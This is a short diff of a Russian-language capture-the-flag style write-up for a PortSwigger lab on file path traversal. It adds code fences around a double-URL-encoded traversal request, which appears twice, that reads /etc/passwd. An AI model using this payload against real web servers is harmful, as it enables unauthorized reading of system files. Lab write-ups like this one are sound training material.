@@ -6,11 +6,15 @@ https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-dec
 я как раз подготовил пейлоад список для такого случая!
 
 мой пейлоад сразу нашел уязвимые пейлоады
+```
 GET /image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+```
 
 и такой 
 
+```
 GET /image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+```
 
 
 сработало простое двойное кодирование!
